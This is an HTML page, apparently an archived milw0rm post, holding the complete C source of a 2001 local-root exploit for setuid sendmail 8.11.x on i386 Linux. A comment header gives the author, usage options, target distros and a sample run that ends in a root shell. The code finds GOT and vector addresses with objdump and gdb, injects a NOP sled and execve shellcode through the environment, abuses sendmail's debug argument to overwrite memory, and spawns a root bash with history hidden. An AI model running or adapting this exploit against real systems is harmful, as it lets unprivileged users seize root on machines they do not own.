<html>
<head>
<title>Sendmail 8.11.x Exploit (i386-Linux)</title>
<pre>
/*
	sendmail 8.11.x exploit (i386-Linux) by sd@sf.cz (sd@ircnet)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	This code exploits well-known local-root bug in sendmail 8.11.x,
	8.12.x may be vulnerable too, but I didn't test it.

	It gives instant root shell with +s sendmail 8.11.x, x &lt; 6

	We're using objdump, gdb &amp; grep in order to obtain VECT, so make sure
	that they're on $PATH, works with 80% accuracy on stripped binaries
	on several distros without changing offsets (rh7.0, rh7.1, suse7.2,
	slackware 8.0...)

	Greetz:

	mlg &amp; smoke : diz is mostly for .ro ppl ;) killall sl3
	sorcerer    : stop da fuckin' asking me how to sploit sm, diz crap
	              is for lamers like you ;))))
	devik       : sm 0wns ;)
	to #linux.cz, #hack ....

	.... and to alot of other ppl, where i can't remeber theyr handles ;)

	args:
	-d     specify depth of analysis (default=32) [bigger = more time]
	-o     change offset (default = -32000) [between 1000..-64000]
	-v     specify victim (default /usr/sbin/sendmail) [+s sm binary]
	-t     specify temp directory (default /tmp/.sxp)
	       [temporary files, should be mounted as nosuid]

	An example (redhat 7.0 CZ):
-------------------------------------------------------------------------------
[sd@pikatchu sxp]$ gcc sx.c -o sx
[sd@localhost sxp]$ ./sx

...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

[*] Victim = /usr/sbin/sendmail
[*] Depth  = 32
[*] Offset = -16384
[*] Temp   = /tmp/.sxp
[*] ESP    = 0xbfffe708
[+] Created /tmp/.sxp
[+] Step 1. setuid() got = 0x080aa028
[*] Step 2. Copying /usr/sbin/sendmail to /tmp/.sxp/sm...OK
[*] Step 3. Disassembling /tmp/.sxp/sm...OK, found 3 targets
[*] Step 4. Exploiting 3 targets:
[1] (33% of targets) GOT=0x080aa028, VECT=0x00000064, offset=-16384
[2] (66% of targets) GOT=0x080aa028, VECT=0x080c6260, offset=-16384

Voila babe, entering rootshell!
Enjoy!
uid=0(root) gid=0(root) groups=0(root)
[root@pikatchu /]# whoami
root
[root@pikatchu /]# exit
exit
Thanx for choosing sd's products ;)
[sd@pikatchu sxp]$
--------------------------------------------------------------------------------

	Enjoy! And don't abuse it too much :)
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;string.h&gt;

#define	SM	&quot;/usr/sbin/sendmail&quot;
#define	OBJDUMP	&quot;objdump&quot;
#define	GDB	&quot;gdb&quot;
#define GREP	&quot;grep&quot;

#define	OURDIR	&quot;/tmp/.sxp&quot;

/* an basic regexp to get interesting stuff from disassembled output
   change it as you like if something doesn't work */

#define	DLINE	&quot;%s -d %s 2&gt; /dev/null | %s -B %d \&quot;mov.*%%.l,(%%e..,%%e..,1)\&quot; | %s \&quot;.mov .*0x80.*,%%e..\&quot;&quot;
#define DLINEA	OBJDUMP, vict, GREP, depth, GREP

#define	BRUTE_DLINE	&quot;%s -d %s 2&gt; /dev/null | %s \&quot;.mov .*0x80.*,%%e..\&quot;&quot;
#define BRUTE_DLINEA	OBJDUMP, vict, GREP


#define NOPLEN	32768

#define uchar unsigned char
#define NOP 0x90

/* 19 bytes ;), shell must be appended */
char shellcode[] =
	&quot;\xeb\x0c\x5b\x31\xc0\x50\x89\xe1&quot;
        &quot;\x89\xe2\xb0\x0b\xcd\x80\xe8\xef&quot;
        &quot;\xff\xff\xff&quot;;


char	scode[512];
char	dvict[] = SM;

struct	target {
	uint	off;
	uint	brk;
	uint	vect;
};

unsigned int get_esp()
{
	__asm__(&quot;movl %esp,%eax&quot;);
}

char	ourdir[256] = OURDIR;

/* cleanup */
void	giveup(int i)
{
	char buf[256];
	sprintf(buf, &quot;/bin/rm -rf %s &gt; /dev/null 2&gt; /dev/null&quot;, ourdir);
	system(buf);
	if (i &gt;= 0) exit(i);
}

/* main sploit, stolen mostly from alsou.c ;) */
void	sploit(char *victim, uint got, uint vect, uint ret)
{
	uchar	egg[sizeof(scode) + NOPLEN + 5];
	char	s[512] = &quot;-d&quot;;
	char	*argv[3];
	char	*envp[2];
	uint	first, last, i;

	strcpy(egg, &quot;EGG=&quot;);
	memset(egg + 4, NOP, NOPLEN);
	strcpy(egg + 4 + NOPLEN, scode);

	last = first = -vect - (0xffffffff - got + 1);
	while (ret) {
		char	tmp[256];
		i = ret &amp; 0xff;
		sprintf(tmp, &quot;%u-%u.%u-&quot;, first, last, i);
		strcat(s, tmp);
		last = ++first;
		ret = ret &gt;&gt; 8;
	}
	s[strlen(s) - 1] = 0;
	argv[0] = victim;
	argv[1] = s;
	argv[2] = NULL;
	envp[0] = egg;
	envp[1] = NULL;
	execve(victim, argv, envp);
}

int	use(char *s)
{
	 printf(&quot;%s [command] [options]\n&quot;
		&quot;-h     this help\n&quot;
		&quot;-d     specify depth of analysis (default=32)\n&quot;
		&quot;-o     change offset (default = -32000)\n&quot;
		&quot;-v     specify victim (default /usr/sbin/sendmail)\n&quot;
		&quot;-t     specify temp directory (default /tmp/.sxp)\n&quot;
		&quot;-b	enables bruteforce (WARNING: this may take about 20-30 minutes!)\n&quot;, s);
	return 1;
}

/* exploited flag */
int	exploited = 0;

/* child root-shell will send us SIGUSR if everything is ok */
void	sigusr(int i)
{
	exploited++;
	giveup(-1);
}

int	main(int argc, char *argv[])
{
	char	victim[256] = SM;
	char	vict[256];
	char	gscr[256];
	char	path[256];
	
	char	d[256];
	struct	stat	st;
	FILE	*f;
	char	buf[256];
	int	got;

	struct	target t[1024];
	uint	off, ep, l;
	int	i,j;

	int	offset = -16384;
	int	esp;
	int	depth = 32;
	int	brute = 0;

	/* rootshell (if argv[0] == NULL) */
	if (!*argv) {
		/* open stdin and stdout */
		dup2(2, 0);
		dup2(2, 1);
		setuid(0);	/* regain root privs */
		setgid(0);
		/* send signal to parent that exploit is done */
		kill(getppid(), SIGUSR1);
		/* l-a-m-e ;) */
		printf(&quot;\nVoila babe, entering rootshell!\nEnjoy!\n&quot;); fflush(stdout);
		chdir(&quot;/&quot;);
		system(&quot;/usr/bin/id&quot;);
		setenv(&quot;BASH_HISTORY&quot;, &quot;/dev/null&quot;, 1);
		execl(&quot;/bin/bash&quot;, &quot;-bash&quot;, NULL);
	}

	printf(&quot;\n...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...\n&quot;
	       &quot;      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n&quot;);

	while ( ( i = getopt(argc, argv, &quot;hd:o:v:t:b&quot;) ) != EOF) {
		switch (i) {
			case 'd':
				if ((!optarg) || (sscanf(optarg, &quot;%d&quot;, &amp;depth) != 1))
					return use(argv[0]);
				break;
			case 'o':
				if ((!optarg) || (sscanf(optarg, &quot;%d&quot;, &amp;offset) != 1))
					return use(argv[0]);
				break;
			case 'v':
				if (!optarg) return use(argv[0]);
				strcpy(victim, optarg);
				break;
			case 't':
				if (!optarg) return use(argv[0]);
				strcpy(ourdir, optarg);
				break;
			case 'b':
				brute++;
				break;
			case 'h':
			default:
				return use(argv[0]);
		}
	}
	if (brute) printf(&quot;[*] Using brute force, this may take some time\n&quot;);
	/* create full path to rootshell, cause
           sendmail will change it's cwd */
	path[0] = 0;
	if (argv[0][0] != '/') {
		getcwd(path, 256);
	}

	/* construct shellcode */
	sprintf(scode, &quot;%s%s/%s&quot;, shellcode, path, argv[0]);

	/* get stack frame */
	esp = get_esp();
	close(0);
	signal(SIGUSR1, sigusr);

	/* remove old stuff */
	giveup(-1);

	printf( &quot;[*] Victim = %s\n&quot;
		&quot;[*] Depth  = %d\n&quot;
		&quot;[*] Offset = %d\n&quot;
		&quot;[*] Temp   = %s\n&quot;
		&quot;[*] ESP    = 0x%08x\n&quot;,
		victim,
		depth,
		offset,
		ourdir,
		esp);
	stat(victim, &amp;st);
	if ((st.st_mode &amp; S_ISUID) == 0) {
		printf(&quot;[-] Bad: %s isn't suid ;(\n&quot;, victim);
	}

	if (access(victim, R_OK + X_OK + F_OK) &lt; 0) {
		printf(&quot;[-] Bad: We haven't access to %s !\n&quot;, victim);
	}

	if (mkdir(ourdir, 0777) &lt; 0) {
		perror(&quot;[-] Can't create our tempdir!\n&quot;);
		giveup(1);
	}
	printf(&quot;[+] Created %s\n&quot;, ourdir);
	sprintf(buf, &quot;%s -R %s | grep setuid&quot;, OBJDUMP, victim);
	f = popen(buf, &quot;r&quot;);
	if (fscanf(f, &quot;%x&quot;, &amp;got) != 1) {
		pclose(f);
		printf(&quot;[-] Cannot get setuid() GOT\n&quot;);
		giveup(1);
	}
	/* get GOT */
	pclose(f);
	printf(&quot;[+] Step 1. setuid() got = 0x%08x\n&quot;, got);
	sprintf(vict, &quot;%s/sm&quot;, ourdir);
	printf(&quot;[*] Step 2. Copying %s to %s...&quot;, victim, vict); fflush(stdout);
	sprintf(buf, &quot;/bin/cp -f %s %s&quot;, victim, vict);
	system(buf);
	if (access(vict, R_OK + X_OK + F_OK) &lt; 0) {
		perror(&quot;Failed&quot;);
		giveup(1);
	}
	printf(&quot;OK\n&quot;);
	/* disassemble &amp; find targets*/
	printf(&quot;[*] Step 3. Disassembling %s...&quot;, vict); fflush(stdout);
	if (!brute) {
		sprintf(buf, DLINE, DLINEA);
	} else {
		sprintf(buf, BRUTE_DLINE, BRUTE_DLINEA);
	}
	f = popen(buf, &quot;r&quot;);
	i = 0;
	while (fgets(buf, 256, f)) {
		int	k, dontadd = 0;
		if (sscanf(buf, &quot;%x: %s %s %s %s %s %s 0x%x,%s\n&quot;,
                    &amp;ep, d, d, d, d, d, d, &amp;off, d) == 9) {
			/* same value ? */
			for (k=0; k &lt; i; k++) {
				if (t[k].off == off) dontadd++;
			}
			/* new value ? */
			if (!dontadd) {
				/* add it to table */
				t[i].off = off;
				t[i++].brk = ep;
			}
		}
	}
	pclose(f);
	printf(&quot;OK, found %d targets\n&quot;, i);

	/* gdb every target and look for theyr VECT */
	printf(&quot;[*] Step 4. Exploiting %d targets:\n&quot;, i); fflush(stdout);
	sprintf(gscr, &quot;%s/gdb&quot;, ourdir);

	off = 0;
	for (j=0; j &lt; i; j++) {
		/* create gdb script */
		f = fopen(gscr, &quot;w+&quot;);
		if (!f) {
			printf(&quot;Cannot create gdb script\n&quot;);
			giveup(1);
		}
		fprintf(f, &quot;break *0x%x\nr -d1-1.1\nx/x 0x%x\n&quot;, t[j].brk, t[j].off);
		fclose(f);
		sprintf(buf, &quot;%s -batch -x %s %s 2&gt; /dev/null&quot;, GDB, gscr, vict);
		f = popen(buf, &quot;r&quot;);
		if (!f) {
			printf(&quot;Failed to spawn gdb!\n&quot;);
			giveup(1);
		}
		/* scan gdb's output */
		while (1) {
			char buf[256];
			char *p;
			t[j].vect = 0;
			p = fgets(buf, 256, f);
			if (!p) break;
			if (sscanf(p, &quot;0x%x %s 0x%x&quot;, &amp;ep, d, &amp;l) == 3) {
				t[j].vect = l;
				off++;
				break;
			}
		}
		pclose(f);
		if (t[j].vect) {
			int	pid;
			printf(&quot;[%d] (%d%% of targets) GOT=0x%08x, VECT=0x%08x, offset=%d\n&quot;, j, j*100/i , got, t[j].vect, offset);
			fflush(stdout);
			pid = fork();
			if (pid == 0) {
				close(1);
				sploit(victim, got, t[j].vect, esp + offset);
			}
			/* wait until sendmail finishes (expoit failed)
	                   or until SIGUSR arrives */
			wait(NULL);
			/* exploited ?? */
			if (exploited) {
				wait(NULL);	/* kill zombie */
				printf(&quot;Thanx for choosing sd's products ;)\n&quot;);
				exit(0);
			}
		}
	}
	printf(&quot;[-] All targets failed, probably not vulnerable ;(\n&quot;);
	giveup(1);
}

/* That's all. */



// milw0rm.com [2001-01-01]
</pre>
</html>

